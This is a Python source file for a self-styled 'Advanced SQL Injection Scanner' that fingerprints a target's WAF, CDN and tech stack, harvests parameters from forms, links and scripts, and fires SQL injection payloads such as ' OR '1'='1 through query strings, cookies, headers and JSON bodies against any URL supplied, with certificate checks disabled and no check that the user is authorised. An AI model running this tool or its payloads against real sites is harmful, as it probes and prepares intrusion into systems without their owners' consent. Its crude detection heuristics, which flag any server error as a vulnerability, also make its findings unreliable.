"""
Advanced SQL Injection Scanner v3.0 (2026)
==========================================
- Auto-Parameters discovery
- WAF/Cloud/Firewall detection
- CDN identification
- Modern tech stack fingerprinting
- Smart payload selection
"""

import asyncio
import httpx
import re
import json
import time
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse, urlencode
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass, field

try:
    from sqlprobe.engine import AsyncHTTPEngine, RequestConfig
    from sqlprobe.detection import DetectionEngine
    from sqlprobe.payloads import PayloadEngine, PayloadType
except ImportError:
    from engine.http_engine import AsyncHTTPEngine, RequestConfig
    from detection.engine import DetectionEngine
    from payloads.engine import PayloadEngine, PayloadType


@dataclass
class VulnerabilityFinding:
    url: str
    parameter: str
    method: str
    injection_type: str
    payload: str
    confidence: float
    severity: str
    details: Dict = field(default_factory=dict)


@dataclass
class TargetInfo:
    url: str
    waf_detected: bool = False
    waf_name: str = ""
    cdn_detected: bool = False
    cdn_name: str = ""
    tech_stack: List[str] = field(default_factory=list)
    endpoints: List[Dict] = field(default_factory=list)
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)


class WAFDetector:
    """Detect WAF, CDN, and Cloud protection."""
    
    WAF_SIGNATURES = {
        'cloudflare': {
            'headers': ['cf-ray', 'cf-cache-status', '__cfduid'],
            'cookies': ['__cfduid', 'cf_clearance'],
            'body': ['cloudflare', 'ray id', 'attention required', 'checking your browser']
        },
        'akamai': {
            'headers': ['akamai-origin', 'akamai-auth'],
            'cookies': ['akamai_'],
            'body': ['akamai', 'reference #']
        },
        'aws_waf': {
            'headers': ['x-amzn-requestid', 'x-awselb'],
            'cookies': ['aws-waf-token'],
            'body': ['aws waf', 'blocked']
        },
        'imperva': {
            'headers': ['x-cdn', 'x-iinfo'],
            'cookies': ['incapsula', 'visid_incap'],
            'body': ['imperva', 'incapsula']
        },
        'f5_asm': {
            'headers': ['x-f5-', 'bigip'],
            'cookies': ['bigip'],
            'body': ['f5 asm', 'rate limit']
        },
        'modsecurity': {
            'headers': [],
            'cookies': [],
            'body': ['mod_security', 'modsecurity', 'blocked by modsecurity']
        },
        'fortiweb': {
            'headers': ['fortigate', 'fortiweb'],
            'cookies': [],
            'body': ['fortiweb', 'fortigate']
        },
        'stackpath': {
            'headers': ['x-spx', 'x-spx'],
            'cookies': [],
            'body': ['stackpath', 'cache']
        },
        'sucuri': {
            'headers': ['x-sucuri', 'x-sucuri-id'],
            'cookies': [],
            'body': ['sucuri', 'cloudproxy']
        },
    }
    
    CDN_SIGNATURES = {
        'cloudfront': ['__cfduid', 'cloudfront'],
        'fastly': ['fastly-', 'x-served-by'],
        'cloudflare': ['cf-ray', 'coloso'],
        'akamai': ['akamai', 'akamaized'],
        'cdnjs': ['cdnjs', 'cloudflare'],
        'jsdelivr': ['jsdelivr'],
        'unpkg': ['unpkg'],
    }
    
    def __init__(self):
        self.waf_detected = False
        self.waf_name = ""
        self.cdn_detected = False
        self.cdn_name = ""
    
    async def detect(self, client: httpx.AsyncClient, url: str) -> TargetInfo:
        target = TargetInfo(url=url)
        
        try:
            r = await client.get(url, timeout=10)
            target.headers = dict(r.headers)
            
            headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
            body_lower = r.text.lower()
            
            for name, sigs in self.WAF_SIGNATURES.items():
                if any(h in headers_lower for h in sigs.get('headers', [])):
                    target.waf_detected = True
                    target.waf_name = name
                    break
                if any(c in headers_lower.get('set-cookie', '') for c in sigs.get('cookies', [])):
                    target.waf_detected = True
                    target.waf_name = name
                    break
                if any(b in body_lower for b in sigs.get('body', [])):
                    target.waf_detected = True
                    target.waf_name = name
                    break
            
            for cdn, sigs in self.CDN_SIGNATURES.items():
                if any(s in body_lower or s in str(headers_lower) for s in sigs):
                    target.cdn_detected = True
                    target.cdn_name = cdn
                    break
            
            if r.cookies:
                target.cookies = dict(r.cookies)
                
        except Exception:
            pass
        
        return target


class TechStackDetector:
    """Detect technology stack."""
    
    TECH_SIGNATURES = {
        'frontend': {
            'react': ['react', 'react-dom', 'reactjs'],
            'vue': ['vue.js', 'vuejs', 'vue-router'],
            'angular': ['angular', 'ng-version', '@angular'],
            'next': ['next.js', '__next'],
            'nuxt': ['nuxt', '__nuxt'],
            'svelte': ['svelte'],
        },
        'backend': {
            'nodejs': ['node', 'express', 'koa', 'hapi'],
            'python': ['python', 'django', 'flask', 'fastapi'],
            'php': ['php', 'laravel', 'symfony', 'wordpress'],
            'asp.net': ['asp.net', '__viewstate', 'iis'],
            'java': ['jsp', 'servlet', 'spring', 'tomcat'],
            'ruby': ['ruby on rails', 'sinatra'],
        },
        'database': {
            'mysql': ['mysql', 'mysqli', 'mariadb'],
            'postgresql': ['postgresql', 'postgres'],
            'mongodb': ['mongodb', 'mongoose'],
            'mssql': ['sql server', 'mssql'],
            'oracle': ['oracle', 'ora-'],
        },
        'server': {
            'nginx': ['nginx'],
            'apache': ['apache'],
            'iis': ['iis', 'microsoft-iis'],
            'node': ['node'],
        }
    }
    
    def detect(self, html: str, headers: Dict) -> List[str]:
        detected = []
        content = html.lower() + str(headers).lower()
        
        for category, technologies in self.TECH_SIGNATURES.items():
            for tech, sigs in technologies.items():
                if any(s in content for s in sigs):
                    detected.append(tech)
        
        return list(set(detected))


class AutoParameterDiscovery:
    """Auto-discover all parameters including hidden ones."""
    
    COMMON_PARAMS = [
        'id', 'user', 'username', 'password', 'email', 'search', 'query', 'q',
        'page', 'limit', 'offset', 'sort', 'order', 'category', 'tag', 's',
        'file', 'filename', 'path', 'url', 'redirect', 'next', 'data', 'reference',
        'site', 'html', 'val', 'validate', 'domain', 'callback', 'return', 'page',
        'feed', 'host', 'port', 'to', 'out', 'view', 'dir', 'show', 'navigation',
        'open', 'panel', 'class', 'func', 'code', 'do', 'run', 'print', 'function',
        'msg', 'test', 'example', 'password', 'admin', 'login', 'token', 'api_key',
        'key', 'auth', 'authorization', 'access', 'token', 'session', '_token',
    ]
    
    def __init__(self):
        self.found_params = set()
    
    async def discover_from_forms(self, soup: BeautifulSoup, base_url: str) -> List[str]:
        params = []
        seen = set()
        
        for form in soup.find_all('form'):
            for inp in form.find_all(['input', 'select', 'textarea', 'button']):
                name = inp.get('name')
                if name and name not in seen:
                    seen.add(name)
                    param_type = inp.get('type', '').lower()
                    if param_type not in ['submit', 'button', 'image', 'reset']:
                        params.append(name)
            
            for inp in form.find_all('input'):
                inp_type = inp.get('type', '').lower()
                if inp_type in ['hidden', 'text']:
                    value = inp.get('value', '')
                    if value and inp.get('name'):
                        params.append(inp.get('name'))
        
        return params
    
    async def discover_from_links(self, soup: BeautifulSoup, base_url: str) -> List[str]:
        params = set()
        
        for link in soup.find_all('a', href=True):
            href = link.get('href', '')
            if '?' in href:
                try:
                    full_url = urljoin(base_url, href)
                    parsed = urlparse(full_url)
                    for key in parse_qs(parsed.query).keys():
                        params.add(key)
                except:
                    pass
        
        return list(params)
    
    async def discover_from_js(self, soup: BeautifulSoup, base_url: str) -> List[str]:
        params = set()
        
        for script in soup.find_all('script'):
            script_text = script.string or ''
            if script_text:
                param_matches = re.findall(r'[\?&]([a-zA-Z0-9_]+)=', script_text)
                params.update(param_matches)
                
                fetch_matches = re.findall(r'fetch\([\'"]([^\'"]+)[\'"]', script_text)
                for url in fetch_matches:
                    if '?' in url:
                        parsed = urlparse(url)
                        for key in parse_qs(parsed.query).keys():
                            params.add(key)
        
        return list(params)
    
    async def generate_common_params(self) -> List[str]:
        return self.COMMON_PARAMS[:30]
    
    async def discover_all(self, html: str, base_url: str) -> List[str]:
        soup = BeautifulSoup(html, 'html.parser')
        
        all_params = set()
        
        form_params = await self.discover_from_forms(soup, base_url)
        all_params.update(form_params)
        
        link_params = await self.discover_from_links(soup, base_url)
        all_params.update(link_params)
        
        js_params = await self.discover_from_js(soup, base_url)
        all_params.update(js_params)
        
        return list(all_params)


class AdvancedScanner:
    """Main scanner with all modern features."""
    
    def __init__(self):
        self.waf_detector = WAFDetector()
        self.tech_detector = TechStackDetector()
        self.param_discovery = AutoParameterDiscovery()
        
        self.payloads = PayloadEngine()
        self.boolean_payloads = [p.value for p in self.payloads.get_payloads_by_type(PayloadType.BOOLEAN_BASED)[:15]]
        self.error_payloads = [p.value for p in self.payloads.get_payloads_by_type(PayloadType.ERROR_BASED)[:10]]
        self.union_payloads = [p.value for p in self.payloads.get_payloads_by_type(PayloadType.UNION_BASED)[:8]]
        self.time_payloads = [p.value for p in self.payloads.get_payloads_by_type(PayloadType.TIME_BASED)[:5]]
    
    async def scan(self, target_url: str) -> List[VulnerabilityFinding]:
        print(f"\n{'='*70}")
        print(f"Advanced SQL Injection Scanner v3.0 (2026)")
        print(f"Target: {target_url}")
        print(f"{'='*70}\n")
        
        async with httpx.AsyncClient(timeout=20, verify=False, follow_redirects=True) as client:
            print("[+] Analyzing target...")
            target = await self.waf_detector.detect(client, target_url)
            
            print(f"\n  [INFO] WAF Detected: {'YES - ' + target.waf_name.upper() if target.waf_detected else 'NO'}")
            print(f"  [INFO] CDN Detected: {'YES - ' + target.cdn_name.upper() if target.cdn_detected else 'NO'}")
            
            r = await client.get(target_url)
            target.tech_stack = self.tech_detector.detect(r.text, r.headers)
            print(f"  [INFO] Tech Stack: {', '.join(target.tech_stack) if target.tech_stack else 'Unknown'}")
            
            print(f"\n[+] Auto-discovering parameters...")
            all_params = await self.param_discovery.discover_all(r.text, target_url)
            
            if not all_params:
                parsed = urlparse(target_url)
                all_params = list(parse_qs(parsed.query).keys())
            
            if not all_params:
                all_params = await self.param_discovery.generate_common_params()
            
            print(f"  [INFO] Found {len(all_params)} parameters: {', '.join(all_params[:10])}...")
            
            print(f"\n[+] Testing for SQL injection...\n")
            
            vulnerabilities = []
            
            for param in all_params[:20]:
                vuln = await self._test_parameter(client, target_url, param, 'GET', r.text)
                if vuln:
                    vulnerabilities.append(vuln)
                    
                    print(f"  [!] VULNERABLE: {param} @ {target_url[:50]}...")
                    print(f"      Type: {vuln.injection_type}, Confidence: {vuln.confidence:.0%}")
                    print(f"      Payload: {vuln.payload[:40]}...\n")
            
            if target.cookies:
                print("[+] Testing cookie parameters...")
                for cookie_name in list(target.cookies.keys())[:5]:
                    vuln = await self._test_parameter(client, target_url, cookie_name, 'COOKIE', r.text)
                    if vuln:
                        vulnerabilities.append(vuln)
                        print(f"  [!] Cookie VULNERABLE: {cookie_name}")
            
            print("[+] Testing header injection...")
            header_payloads = ["' OR '1'='1", "1; SELECT * FROM users", "1' OR '1'='1"]
            inject_headers = {
                'X-Forwarded-For': header_payloads[0],
                'X-Real-IP': "1.1.1.1'; " + header_payloads[0],
                'User-Agent': "Mozilla'; " + header_payloads[0],
                'X-Custom-Header': header_payloads[0],
            }
            
            for header_name, header_value in inject_headers.items():
                try:
                    r = await client.get(target_url, headers={header_name: header_value}, timeout=10)
                    if r.status_code >= 500 or 'sql' in r.text.lower()[:500]:
                        print(f"  [!] Header INJECTION: {header_name}")
                        vulnerabilities.append(VulnerabilityFinding(
                            url=target_url, parameter=header_name, method='HEADER',
                            injection_type="header_injection", payload=header_value,
                            confidence=0.8, severity="HIGH"
                        ))
                except:
                    pass
            
            print("[+] Testing JSON API endpoints...")
            json_payloads = [
                {"id": "1 OR 1=1"},
                {"id": "1' OR '1'='1"},
                {"search": "test' OR 1=1--"},
            ]
            
            for json_payload in json_payloads:
                try:
                    r = await client.post(target_url, json=json_payload, timeout=10)
                    if r.status_code >= 500 or 'sql' in r.text.lower()[:500]:
                        print(f"  [!] JSON API VULNERABLE")
                        vulnerabilities.append(VulnerabilityFinding(
                            url=target_url, parameter="JSON_BODY", method='POST',
                            injection_type="json_injection", payload=str(json_payload),
                            confidence=0.75, severity="HIGH"
                        ))
                except:
                    pass
            
            print(f"\n{'='*70}")
            print(f"SCAN COMPLETE")
            print(f"{'='*70}")
            print(f"Total vulnerabilities found: {len(vulnerabilities)}")
            
            return vulnerabilities
    
    async def _test_parameter(self, client: httpx.AsyncClient, url: str, param: str, method: str, baseline: str) -> Optional[VulnerabilityFinding]:
        test_payloads = self.boolean_payloads[:8] + self.error_payloads[:5] + self.union_payloads[:3]
        
        results = []
        
        for payload in test_payloads:
            try:
                if method == 'GET':
                    sep = '&' if '?' in url else '?'
                    test_url = f"{url}{sep}{param}={payload}"
                    r = await client.get(test_url, timeout=15)
                elif method == 'COOKIE':
                    cookies = {param: payload}
                    r = await client.get(url, cookies=cookies, timeout=15)
                else:
                    r = await client.post(url, data={param: payload}, timeout=15)
                
                similarity = self._calculate_similarity(baseline, r.text)
                status_diff = r.status_code != 200
                content_len_diff = abs(len(r.text) - len(baseline)) / max(len(baseline), 1)
                
                is_vuln = False
                conf = 0.0
                vuln_type = "unknown"
                
                if 'sql' in r.text.lower()[:1000] or 'syntax' in r.text.lower()[:1000]:
                    is_vuln = True
                    conf = 0.95
                    vuln_type = "error_based"
                elif 'ORA-' in r.text or 'MySQL' in r.text or 'PostgreSQL' in r.text:
                    is_vuln = True
                    conf = 0.9
                    vuln_type = "error_based"
                elif r.status_code >= 500:
                    is_vuln = True
                    conf = 0.85
                    vuln_type = "error_based"
                elif r.status_code == 403 or r.status_code == 429:
                    is_vuln = False
                elif status_diff or similarity < 0.6 or content_len_diff > 0.3:
                    if similarity < 0.5:
                        is_vuln = True
                        conf = 0.85
                        vuln_type = "boolean_based"
                    elif similarity < 0.7:
                        is_vuln = True
                        conf = 0.75
                        vuln_type = "boolean_based"
                    elif similarity < 0.85 and content_len_diff > 0.1:
                        is_vuln = True
                        conf = 0.65
                        vuln_type = "boolean_based"
                
                if is_vuln:
                    results.append((conf, vuln_type, payload, similarity))
                    
            except Exception:
                pass
        
        if results:
            best = max(results, key=lambda x: x[0])
            return VulnerabilityFinding(
                url=url, parameter=param, method=method,
                injection_type=best[1], payload=best[2],
                confidence=best[0], severity="HIGH" if best[0] > 0.7 else "MEDIUM"
            )
        
        return None
    
    def _calculate_similarity(self, text1: str, text2: str) -> float:
        if not text1 or not text2:
            return 1.0
        len1, len2 = len(text1), len(text2)
        if abs(len1 - len2) / max(len1, len2, 1) > 0.5:
            return 0.5
        matches = sum(1 for a, b in zip(text1[:1000], text2[:1000]) if a == b)
        return matches / max(len1, len2, 1)


def display_banner():
    try:
        print("""
╔═════════════════════════════════════════════════════════════════════════╗
║                                                                         ║
║    ███████╗ ██████╗ ██╗     ██████╗ ██████╗  ██████╗ ██████╗ ███████╗   ║
║    ██╔════╝██╔═══██╗██║     ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝   ║
║    ███████╗██║   ██║██║     ██████╔╝██████╔╝██║   ██║██████╔╝█████╗     ║
║    ╚════██║██║▄▄ ██║██║     ██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝     ║
║    ███████║╚██████╔╝███████╗██║     ██║  ██║╚██████╔╝██████╔╝███████╗   ║
║    ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝   ║
║                                                                         ║
║               Advanced Scanner v3.0 (2026)                             ║
║               Auto-Parameters + WAF Detection                          ║
║                                                                         ║
╚═════════════════════════════════════════════════════════════════════════╝
        """)
    except:
        print("="*70)
        print("Advanced SQL Scanner v3.0 (2026)")
        print("="*70)


async def main():
    import sys
    
    display_banner()
    
    url = sys.argv[1] if len(sys.argv) > 1 else input("Enter Target Url: ").strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    scanner = AdvancedScanner()
    results = await scanner.scan(url)
    
    if results:
        print("\n[CRITICAL] Results:")
        for v in results:
            if v.confidence > 0.8:
                print(f"  [!] {v.parameter} @ {v.url[:60]}... ({v.injection_type}) - {v.confidence:.0%}")


if __name__ == '__main__':
    asyncio.run(main())